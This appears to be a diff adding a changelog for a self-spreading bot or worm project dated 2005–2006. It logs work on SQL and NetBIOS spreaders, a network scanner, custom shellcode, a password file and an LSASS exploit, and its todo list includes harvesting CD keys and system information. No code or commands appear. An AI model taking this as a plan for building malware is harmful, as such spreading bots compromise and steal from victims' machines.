@@ -1,0 +1,72 @@
+2/12/06
+- Shellcode unit. own new shellcode for the bot - only for ftp now.
+1/12/06
+- scanner revision
+24/09/06
+----------
+- Bot is now spreading.
+- many functions and procedure - fixed
+- Sql spreader - remake, tested.
+- netbios spreader - remake - tested.
+- password file
+- Scanner stable now, eating less memory, have scanhost option added.
+
+
+---------
+16/9/06
+- Scanner Recreate. working with winsock now, and timeout is added.
+
+1/9/06
+- changes in ps function - again :(
+- changes in scanner
+	- should work really better now
+	- added scan host option
+	- should not crash now
+	- scanner is working
+		- todo:
+		- Threads need less memory
+		- the free isnt that good, some memory isnt getting freeing and memory is growing and growing
+
+
+8/4/05
+- Rewrite the scanner. really better now.
+- Rewrite the ps function, core improved.
+
+6/4/05
+- Fixed Ident( Seems To Crash)
+
+5/4/05
+- Sql Spreader Added.
+- Rehash The Core
+  - Cleaned Lots of Shitty Code.
+  - Bot is not eating 100% CPU // P.S: It was the fucking ftp.
+  - Added Ident.
+  - Improved Alot The Core :)
+
+12.03.2005:
+-finish protect mode
+ if u are asking me i really think its shit, can do much better.
+
+0.1:
+updated the scanner to muili port scanner
+added debug mode
+fixed lots of bugs
+nt sprader - updated.. have to fix the getshares !! 
+added psfunction yeah!!
+added login Procedure and her Subs Function
+					- GetUserPos
+					- IFLogged
+					- Array Of users
+-working about lsass exploit.
+
+
+todo
+
+all info - total space up time ect
+get cd keys
+disk info
+disk info more - voliom ect
+
+.sysinfo - all cpu inf ect
+.wininfo all revoultion ect..
+.memory info
